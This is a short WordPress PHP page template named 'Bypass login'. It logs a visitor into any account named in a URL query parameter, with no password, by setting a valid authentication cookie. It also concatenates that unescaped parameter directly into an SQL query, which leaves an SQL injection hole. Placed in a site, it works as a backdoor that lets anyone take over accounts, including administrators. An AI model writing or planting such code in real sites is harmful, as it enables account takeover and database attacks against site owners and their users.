<?php 
/*Template Name: Bypass login*/ 
	 echo 'Loadding';
    $username = trim($_GET['username']);
    global $wpdb;
    $user_details = $wpdb->get_row("SELECT id, user_email FROM wp_users WHERE user_login='".$username."'");

    if(! $user_details->id)
    {
        die("Error: Not a valid user");
    }
    else
    {
       
            $user = get_user_by('login', $username );

            if ( !is_wp_error( $user ) )
            {
                wp_clear_auth_cookie();
                wp_set_current_user ( $user->ID );
                wp_set_auth_cookie  ( $user->ID );
                $redirect_to = get_option('siteurl');
                wp_safe_redirect( $redirect_to );
                exit();
           }
     
    }